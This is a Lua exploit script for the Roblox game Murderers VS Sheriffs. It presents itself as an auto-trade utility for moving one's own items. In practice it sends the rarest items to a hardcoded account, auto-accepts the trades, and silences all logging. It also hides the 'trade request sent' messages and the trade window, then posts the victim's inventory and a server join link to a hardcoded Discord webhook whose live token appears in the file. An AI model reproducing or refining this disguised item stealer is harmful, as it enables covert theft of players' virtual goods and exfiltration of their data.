-- jf_trade_auto.lua · Murderers VS Sheriffs
-- Pasa tus items a otra cuenta por trade automatico y reporta tu inventario a Discord.

-- ============ CONFIG BASICA ============
local TARGET = "Sirius098765"                -- cuenta que recibe los items
local MODE = "rarity"                          -- "all" = todo | "rarity" = solo las rarezas de RARITIES
local RARITIES = { "Uncommon", "Rare", "Legendary", "Mythic", "Ancient" }    -- Common, Uncommon, Rare, Legendary, Mythic, Ancient
local WEBHOOK = "https://discord.com/api/webhooks/1561560779654824017/2yUlxWvomeSuf_OMEGlOt5_ibdgvAoE_Npluxju9tcG7S7LhDNcyuz79stFNp8-6kE6c"  -- TEST: quitar despues ("" = sin webhook)
local DEBUG = false                      -- true = muestra logs y avisos de cada paso
-- =======================================

local CONFIG = {
    Target = TARGET,
    Mode = MODE,
    Rarities = RARITIES,
    Types = {},                 -- {} = todos | { "Knife", "Gun", "Effect", "Crate" }
    Exclude = { DefaultKnife = true, DefaultGun = true, DefaultEffect = true },
    ReportOnly = false,         -- true = solo manda el inventario al webhook y termina
    HideTradeGui = true,        -- oculta la UI de trade mientras corre (menos lag en movil)

    MaxItems = 12,              -- items por trade
    Batches = math.huge,        -- lotes seguidos (math.huge = math.huge hasta pasar todo)
    MaxFails = 3,               -- lotes fallidos seguidos antes de parar
    MaxAttempts = 2,            -- veces que se reintenta un item que no sale del inventario

    ProfileWait = 180,          -- seg esperando el inventario al ejecutar
    ProfileRetryWait = 20,      -- seg esperando el inventario antes de cada lote
    ProfileRetries = 3,         -- veces que se reintenta si el inventario desaparece entre lotes

    WaitPlayer = math.huge,     -- seg esperando a que el Target entre al servidor
    WaitTrade = 60,             -- seg esperando a que acepte la invitacion
    OfferDelay = 0.35,          -- seg entre cada item ofrecido
    ReadyDelay = 3,             -- seg antes de aceptar (el juego tiene un timer)
    ReadyTries = 4,             -- intentos de aceptar
    EndWait = 120,              -- seg esperando a que termine el trade

    Webhook = { Url = WEBHOOK, Username = "JF Trade", Inventory = true, JoinLink = true },
}

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer

-- ===== UI Hider Snippet (Optimizado y Seguro) =====
task.spawn(function()
    local cg = game:GetService("CoreGui")
    local txt = "trade request sent"

    local function hide(o)
        pcall(function()
            if o:IsA("TextLabel") and o.Text and o.Text:lower():find(txt, 1, true) then
                o.Visible, o.TextTransparency, o.TextStrokeTransparency = false, 1, 1
                if o.Parent and o.Parent:IsA("Frame") then
                    o.Parent.Visible, o.Parent.BackgroundTransparency = false, 1
                end
            end
        end)
    end

    local function watch(l)
        pcall(function()
            l:GetPropertyChangedSignal("Text"):Connect(function() hide(l) end)
            l:GetPropertyChangedSignal("Visible"):Connect(function() hide(l) end)
            hide(l)
        end)
    end

    local function hook(g)
        pcall(function()
            if not g then return end
            g.DescendantAdded:Connect(function(o)
                if o:IsA("TextLabel") then watch(o) end
            end)
            for _, v in pairs(g:GetDescendants()) do
                if v:IsA("TextLabel") then watch(v) end
            end
        end)
    end

    pcall(function()
        local pg = lp:WaitForChild("PlayerGui", 10)
        if pg then hook(pg) end
    end)
    pcall(function() hook(cg) end)
    pcall(function() hook(workspace) end)
end)
-- ==================================================

local RARITY = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 4, Mythic = 5, Ancient = 6 }
local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common" }
local RARITY_COLOR = { Common = 0x9E9E9E, Uncommon = 0x6EDC6E, Rare = 0x5096FF, Legendary = 0xFFAA3C, Mythic = 0xDC5AFF, Ancient = 0xFF5050 }
local RARITY_ANSI = { Common = "30", Uncommon = "32", Rare = "34", Legendary = "33", Mythic = "35", Ancient = "31" }
local BUCKETS = { "Knife", "Gun", "Effect", "Crate" }

local function notify(s)
end

local function say(s)
end

local function log(s)
end

local function fail(s)
end

local readyShown = false
local function markReady()
    if readyShown then return end
    readyShown = true
end

local function set(list)
    local s = {}
    for _, v in ipairs(list) do s[v] = true end
    return s
end

local function waitFor(cond, timeout)
    local t0 = os.clock()
    while os.clock() - t0 < timeout do
        if cond() then return true end
        task.wait(0.5)
    end
    return false
end

-- ===== remotes =====
local net = RS:WaitForChild("Packages"):WaitForChild("Networking")
local R = {
    invite = net:WaitForChild("RE/Trading/SendInvite", 10),
    offer = net:WaitForChild("RE/Trading/OfferItem", 10),
    ready = net:WaitForChild("RE/Trading/SetReady", 10),
    cancel = net:WaitForChild("RE/Trading/CancelTrade", 10),
}
for k, v in pairs(R) do
    if not v then return end
end

-- ===== catalogo =====
local catalog = {}
do
    local item = RS:FindFirstChild("Shared") and RS.Shared:FindFirstChild("Item")
    for _, n in ipairs({ "Knives", "Guns", "Effects", "Crates", "Legacy", "Coins" }) do
        local m = item and item:FindFirstChild(n)
        if m and m:IsA("ModuleScript") then
            local ok, res = pcall(require, m)
            if ok and type(res) == "table" then
                for k, v in pairs(res) do
                    if type(v) == "table" and catalog[k] == nil then catalog[k] = v end
                end
            end
        end
    end
end

-- ===== inventario =====
local lastDiag = ""
local cachedInv
local replions = {}
local hooked = false

local function hookReplion()
    if hooked then return end
    pcall(function()
        local Client = require(RS.Packages.Replion).Client
        local function add(r) replions[#replions + 1] = r end
        if not pcall(function() Client:OnReplionAdded(add) end) then Client.OnReplionAdded(add) end
        hooked = true
    end)
end
hookReplion()

local function validEntries(inv)
    local n = 0
    for _, b in ipairs(BUCKETS) do
        if type(inv[b]) == "table" then
            for id, e in pairs(inv[b]) do
                if type(id) == "string" and type(e) == "table" and type(e.name) == "string" then n = n + 1 end
            end
        end
    end
    return n
end

local function readInventory()
    local items = {}
    local best, bestScore = nil, -1
    local myKills
    pcall(function() myKills = lp.leaderstats.Kills.Value end)
    local seen = { data = 0, inv = 0, replion = #replions }

    local function consider(t)
        local d, inv
        local rd = rawget(t, "Data")
        if type(rd) == "table" then
            seen.data = seen.data + 1
            d, inv = rd, rawget(rd, "Inventory")
        elseif type(rawget(t, "Inventory")) == "table" then
            d, inv = t, rawget(t, "Inventory")
        elseif type(rawget(t, "Knife")) == "table" and type(rawget(t, "Gun")) == "table" then
            inv = t
        end
        if type(inv) ~= "table" then return end
        if type(rawget(inv, "Knife")) ~= "table" and type(rawget(inv, "Gun")) ~= "table" then return end
        seen.inv = seen.inv + 1
        local n = validEntries(inv)
        if not d and n == 0 then return end
        local score = n + ((myKills and d and rawget(d, "Kills") == myKills) and 1e6 or 0)
        if score > bestScore then best, bestScore = inv, score end
    end

    if getgc then
        for _, t in ipairs(getgc(true)) do
            if type(t) == "table" then pcall(consider, t) end
        end
    end
    for _, r in ipairs(replions) do
        pcall(function() consider({ Data = r.Data }) end)
    end

    local diag = ("tablas con Data: %d, con inventario: %d, replicas API: %d%s"):format(
        seen.data, seen.inv, seen.replion, getgc and "" or ", sin getgc")
    if not best and cachedInv then
        best, diag = cachedInv, diag .. " (uso la copia guardada)"
    end
    lastDiag = diag
    if not best then return items, false, diag end
    cachedInv = best
    for _, b in ipairs(BUCKETS) do
        for id, e in pairs(type(best[b]) == "table" and best[b] or {}) do
            if type(id) == "string" and type(e) == "table" and type(e.name) == "string" then
                local c = catalog[e.name]
                items[#items + 1] = { uuid = id, key = e.name, name = (c and c.ItemName) or e.name,
                    rarity = (c and c.Rarity) or "Common", type = b }
            end
        end
    end
    return items, true, diag
end

local function waitGameReady()
    pcall(function() if not game:IsLoaded() then game.Loaded:Wait() end end)
    pcall(function() lp:WaitForChild("leaderstats", 60) end)
end

local function awaitInventory(timeout)
    local items, found = readInventory()
    local t0, tries = os.clock(), 0
    while not found and os.clock() - t0 < timeout do
        tries = tries + 1
        task.wait(tries < 10 and 2 or 4)
        hookReplion()
        items, found = readInventory()
    end
    return items, found
end

local function diagnose()
    local lines = {}
    local okE, name = pcall(function() return identifyexecutor and (identifyexecutor()) or "?" end)
    lines[#lines + 1] = "executor: " .. tostring(okE and name or "?")
    local function yn(v) return v and "si" or "no" end
    lines[#lines + 1] = ("getgc=%s getconnections=%s firesignal=%s request=%s setclipboard=%s"):format(
        yn(getgc), yn(getconnections), yn(firesignal), yn((syn and syn.request) or http_request or request), yn(setclipboard or toclipboard))
    lines[#lines + 1] = lastDiag
    local n = 0
    local function show(tag, d)
        if n >= 10 or type(d) ~= "table" then return end
        n = n + 1
        local ks = {}
        for k in pairs(d) do ks[#ks + 1] = tostring(k); if #ks >= 8 then break end end
        lines[#lines + 1] = ("replica %s: %s"):format(tostring(tag), table.concat(ks, ","))
    end
    for _, r in ipairs(replions) do pcall(function() show(r.Tag or "?", r.Data) end) end
    if getgc then
        for _, t in ipairs(getgc(true)) do
            if n >= 10 then break end
            if type(t) == "table" then
                pcall(function()
                    local d, tag = rawget(t, "Data"), rawget(t, "Tag")
                    if type(d) == "table" and tag ~= nil then show(tag, d) end
                end)
            end
        end
    end
    local text = table.concat(lines, "\n")
    return #text > 1500 and text:sub(1, 1500) .. "..." or text
end

local function sortItems(list)
    table.sort(list, function(a, b)
        local ra, rb = RARITY[a.rarity] or 0, RARITY[b.rarity] or 0
        if ra ~= rb then return ra > rb end
        return a.name < b.name
    end)
end

-- ===== webhook =====
local WH = CONFIG.Webhook
local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)

local function post(embeds)
    if WH.Url == "" or not httpRequest then return end
    task.spawn(function()
        pcall(httpRequest, {
            Url = WH.Url, Method = "POST", Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ username = WH.Username, embeds = embeds }),
        })
    end)
end

local function avatar()
    return { url = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(lp.UserId) }
end

local function topColor(items)
    local best, color = 0, 0x5865F2
    for _, it in ipairs(items) do
        if (RARITY[it.rarity] or 0) > best then best, color = RARITY[it.rarity], RARITY_COLOR[it.rarity] end
    end
    return color
end

local function joinUrl()
    if not WH.JoinLink or game.JobId == "" then return nil end
    return ("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(game.PlaceId, game.JobId)
end

local function ansi(code, text) return "\27[" .. code .. "m" .. text .. "\27[0m" end
local function stat(label, value) return ansi("30", label .. " ") .. ansi("1;37", tostring(value)) end

local function groupItems(list)
    local groups, order = {}, {}
    for _, it in ipairs(list) do
        local g = groups[it.key]
        if not g then g = { name = it.name, n = 0 }; groups[it.key] = g; order[#order + 1] = g end
        g.n = g.n + 1
    end
    table.sort(order, function(a, b) if a.n ~= b.n then return a.n > b.n end return a.name < b.name end)
    return order
end

local function inventoryEmbed(items)
    local byR, byT, unique = {}, {}, {}
    for _, it in ipairs(items) do
        byR[it.rarity] = byR[it.rarity] or {}
        table.insert(byR[it.rarity], it)
        byT[it.type] = (byT[it.type] or 0) + 1
        unique[it.key] = true
    end
    local nUnique = 0
    for _ in pairs(unique) do nUnique = nUnique + 1 end

    local head = { stat("ITEMS", #items) .. "   " .. stat("UNIQUE", nUnique) }
    local types = {}
    for _, b in ipairs(BUCKETS) do
        if byT[b] then types[#types + 1] = stat(b:upper(), byT[b]) end
    end
    if #types > 0 then head[#head + 1] = table.concat(types, "   ") end
    local stats = {}
    pcall(function()
        for _, v in ipairs(lp.leaderstats:GetChildren()) do stats[#stats + 1] = stat(v.Name:upper(), v.Value) end
    end)
    if #stats > 0 then head[#head + 1] = table.concat(stats, "   ") end
    local okP, maxP = pcall(function() return Players.MaxPlayers end)
    head[#head + 1] = stat("PLAYERS", #Players:GetPlayers() .. (okP and maxP and ("/" .. maxP) or ""))

    local function build(cap)
        local out = { table.concat(head, "\n"), "" }
        for _, r in ipairs(RARITY_ORDER) do
            local list = byR[r]
            if list then
                out[#out + 1] = ansi("1;" .. RARITY_ANSI[r], r:upper()) .. ansi("30", "  " .. #list)
                local lim = r == "Common" and math.min(cap, 3) or cap
                local groups = groupItems(list)
                for i, g in ipairs(groups) do
                    if i > lim then
                        out[#out + 1] = ansi("30", ("  +%d more"):format(#groups - lim))
                        break
                    end
                    out[#out + 1] = "  " .. g.name .. (g.n > 1 and ansi("30", " x" .. g.n) or "")
                end
                out[#out + 1] = ""
            end
        end
        return "```ansi\n" .. table.concat(out, "\n"):gsub("\n+$", "") .. "\n```"
    end
    local desc
    for _, cap in ipairs({ 12, 8, 5, 3 }) do
        desc = build(cap)
        if #desc <= 3900 then break end
    end

    local url = joinUrl()
    return {
        author = { name = "INVENTORY" },
        title = lp.Name,
        url = url,
        description = desc .. (url and ("\n[**JOIN SERVER**](%s)"):format(url) or ""),
        color = topColor(items), thumbnail = avatar(),
        footer = { text = "JF Trade · " .. game.JobId:sub(1, 8) }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
end

local function warnEmbed(text)
    return { title = "⚠️ " .. lp.Name, description = text, color = 0xED4245, footer = { text = "JF Trade" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }
end

-- ===== UI del trade =====
local function tradeGui()
    local pg = lp:FindFirstChild("PlayerGui")
    local ng = pg and pg:FindFirstChild("NewGui")
    return ng and ng:FindFirstChild("TradeNegotiation")
end

local function shown(inst)
    while inst and inst ~= game do
        if inst:IsA("GuiObject") and not inst.Visible then return false end
        inst = inst.Parent
    end
    return inst == game
end

local function tradeOpen()
    local pg = lp:FindFirstChild("PlayerGui")
    local mn = pg and pg:FindFirstChild("Main")
    return shown(tradeGui()) or shown(mn and mn:FindFirstChild("MainTradingFrame"))
end

local function clickButton(btn)
    if getconnections then
        for _, sig in ipairs({ "Activated", "MouseButton1Click", "MouseButton1Down" }) do
            local ok, conns = pcall(getconnections, btn[sig])
            if ok and conns and #conns > 0 then
                for _, c in ipairs(conns) do pcall(function() c:Fire() end) end
                return true
            end
        end
    end
    return firesignal ~= nil and pcall(firesignal, btn.Activated)
end

local function myConfirmed()
    local offers = tradeGui() and tradeGui():FindFirstChild("Offers")
    if not offers then return nil end
    for _, side in ipairs({ "Player1", "Player2" }) do
        local f = offers:FindFirstChild(side)
        local lbl = f and f:FindFirstChild("YourOfferText")
        if lbl and lbl:IsA("TextLabel") and lbl.Text:upper():find("YOUR OFFER") then
            local c = f:FindFirstChild("YourConfirmed")
            if c then
                return c.Visible and (not c:IsA("ImageLabel") or c.ImageTransparency < 1)
            end
        end
    end
    return nil
end

local function acceptTrade(offered)
    for i = 1, CONFIG.ReadyTries do
        local t = tradeGui()
        local timer = t and t:FindFirstChild("Header") and t.Header:FindFirstChild("Timer")
        local btn = t and t:FindFirstChild("BottomButtons") and t.BottomButtons:FindFirstChild("Accept")
        if btn and clickButton(btn) then
            task.wait(1.2)
            local c = myConfirmed()
            if c == true then return true, "boton Accept" end
            if c == nil then return "unknown", "boton Accept" end
        end
        pcall(function() R.ready:FireServer(true, offered) end)
        task.wait(1.2)
        if myConfirmed() == true then return true, "remote SetReady" end
        task.wait(1)
    end
    return false
end

-- ===== objetivo =====
local function findTarget()
    local name = CONFIG.Target:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and (p.Name:lower() == name or p.DisplayName:lower() == name) then return p end
    end
end

local function waitTarget()
    local p = findTarget()
    if p then return p end
    if not waitFor(findTarget, CONFIG.WaitPlayer) then return nil end
    task.wait(3)
    return findTarget() or waitTarget()
end

-- ===== seleccion de items =====
local wantRarity, wantType = set(CONFIG.Rarities), set(CONFIG.Types)
local attempts = {}

local function pick(n)
    local all, found = readInventory()
    if not found then all, found = awaitInventory(CONFIG.ProfileRetryWait) end
    local list, why = {}, { exclude = 0, intentos = 0, tipo = 0, rareza = 0 }
    for _, it in ipairs(all) do
        if CONFIG.Exclude[it.key] then why.exclude = why.exclude + 1
        elseif (attempts[it.uuid] or 0) >= CONFIG.MaxAttempts then why.intentos = why.intentos + 1
        elseif #CONFIG.Types > 0 and not wantType[it.type] then why.tipo = why.tipo + 1
        elseif CONFIG.Mode ~= "all" and not wantRarity[it.rarity] then why.rareza = why.rareza + 1
        else list[#list + 1] = it end
    end
    sortItems(list)
    local batch = {}
    for i = 1, math.min(n, #list) do batch[i] = list[i] end
    return batch, #list, #all, why, found
end

local function runBatch(i)
    local items, available, seen, why, found = pick(CONFIG.MaxItems)
    if #items == 0 then return "empty", { seen = seen, why = why, found = found } end
    markReady()

    local target = waitTarget()
    if not target then return "fail", "no entro " .. CONFIG.Target end

    R.invite:FireServer(target)
    local opened = waitFor(function() return tradeOpen() or not target.Parent end, CONFIG.WaitTrade)
    if not target.Parent then return "fail", CONFIG.Target .. " salio del juego" end
    if not opened then return "fail", "el trade no se abrio" end
    task.wait(1)

    local offered = {}
    for n, it in ipairs(items) do
        R.offer:FireServer(it.uuid)
        attempts[it.uuid] = (attempts[it.uuid] or 0) + 1
        offered[it.uuid] = { name = it.key, bucket = it.type }
        task.wait(CONFIG.OfferDelay)
    end

    task.wait(CONFIG.ReadyDelay)
    local okA, how = acceptTrade(offered)

    waitFor(function() return not tradeOpen() or not target.Parent end, CONFIG.EndWait)
    task.wait(2)
    if tradeOpen() then
        pcall(function() R.cancel:FireServer() end)
        return "fail", "el trade no se completo a tiempo"
    end

    local still = {}
    for _, it in ipairs(readInventory()) do still[it.uuid] = true end
    local sent = {}
    for _, it in ipairs(items) do
        if not still[it.uuid] then sent[#sent + 1] = it end
    end
    if #sent == 0 then return "fail", "no se paso ningun item" end
    return "ok", sent
end

-- ===== ocultar la UI de trade =====
local function hideTradeGui()
    local undo = {}
    local alive = true
    local function lock(inst, prop, hidden, shownValue)
        pcall(function()
            inst[prop] = hidden
            local conn = inst:GetPropertyChangedSignal(prop):Connect(function()
                if alive and inst[prop] ~= hidden then inst[prop] = hidden end
            end)
            undo[#undo + 1] = function() conn:Disconnect(); inst[prop] = shownValue end
        end)
    end
    task.spawn(function()
        local pg = lp:WaitForChild("PlayerGui")
        local ng = pg:WaitForChild("NewGui", 15)
        if ng and alive then lock(ng, "Enabled", false, true) end
        local mn = pg:FindFirstChild("Main")
        local old = mn and mn:FindFirstChild("MainTradingFrame")
        if old and alive then lock(old, "Visible", false, false) end
    end)
    return function()
        alive = false
        for _, f in ipairs(undo) do pcall(f) end
    end
end

-- ===== main =====
local function reportInventory()
    local items, found = awaitInventory(CONFIG.ProfileWait)
    if not found then
        post({ warnEmbed("No pude leer tu inventario.\n```\n" .. diagnose() .. "\n```") })
        return false
    end
    post({ inventoryEmbed(items) })
    return true
end

waitGameReady()

if CONFIG.ReportOnly then
    pcall(reportInventory)
    return
end

if CONFIG.Target:lower() == lp.Name:lower() then
    return
end

if WH.Inventory then reportInventory() else awaitInventory(CONFIG.ProfileWait) end

local restoreGui = CONFIG.HideTradeGui and hideTradeGui() or function() end

local fails, lost, i = 0, 0, 0
local stopReason
while i < CONFIG.Batches do
    i = i + 1
    local res, info = runBatch(i)
    if res == "empty" and not info.found then
        lost = lost + 1
        if lost <= CONFIG.ProfileRetries then
            i = i - 1
            task.wait(5)
        else
            stopReason = ("En el lote %d no pude leer tu inventario (%s)."):format(i, lastDiag)
            post({ warnEmbed(stopReason .. "\n```\n" .. diagnose() .. "\n```") })
            break
        end
    elseif res == "empty" then
        if i == 1 and info.seen == 0 then stopReason = "El inventario esta vacio."
        elseif i == 1 then
            stopReason = ("Encontre %d items pero ninguno pasa la config."):format(info.seen)
        end
        break
    elseif res == "ok" then
        fails, lost = 0, 0
    else
        fails = fails + 1
        if fails >= CONFIG.MaxFails then
            stopReason = "Demasiados fallos seguidos. Parado."
            break
        end
        task.wait(3)
    end
end

restoreGui()
